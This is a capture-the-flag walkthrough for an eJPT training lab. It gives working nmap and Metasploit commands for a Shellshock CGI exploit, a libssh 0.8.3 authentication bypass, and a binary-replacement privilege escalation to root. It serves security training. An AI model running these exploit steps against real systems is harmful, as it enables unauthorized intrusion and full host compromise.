# System-Host Based Attacks CTF 2

## Overview

This walkthrough documents the methodology used to solve the System-Host Based Attacks CTF 2 Skill Check Lab from the eJPT course.

## Attack Path

1. Enumerate Target 1
2. Discover Shellshock vulnerability
3. Exploit CGI service
4. Capture Flag 1 and Flag 2
5. Enumerate Target 2
6. Exploit libssh authentication bypass
7. Capture Flag 3
8. Perform privilege escalation
9. Capture Flag 4

## Target 1

### Enumeration
```bash
nmap -sV -sC -O -p- -v target1.ine.local
```

### Vulnerability Discovery
```bash
db_nmap -sV target1.ine.local --script=http-shellshock --script-args "http-shellshock.uri=/browser.cgi"
```

### Exploitation
```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS target1.ine.local
set TARGETURI /browser.cgi
run
```

### Session Upgrade
```bash
sessions -u 1
```

### Flags
- Flag 1: Located in root directory
- Flag 2: Located under /opt/apache/htdocs/

## Target 2

### Enumeration
```bash
db_nmap -sV -sC -O -p- -v target2.ine.local
```

### Vulnerable Service
libssh 0.8.3

### Exploitation
```bash
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS target2.ine.local
set SPAWN_PTY true
run
```

### Privilege Escalation
```bash
rm greetings
cp /bin/bash greetings
chmod +x greetings
./welcome
id
```

Root access obtained through insecure privileged binary execution.

## Skills Practiced

- Nmap Enumeration
- Shellshock Exploitation
- LibSSH Authentication Bypass
- Metasploit Framework
- Linux Privilege Escalation
- Post Exploitation
- Flag Hunting

## MITRE ATT&CK

- T1190 Exploit Public-Facing Application
- T1059 Command and Scripting Interpreter
- T1078 Valid Accounts
- T1548 Abuse Elevation Control Mechanism

## Educational Disclaimer

This writeup was performed in an authorized training environment.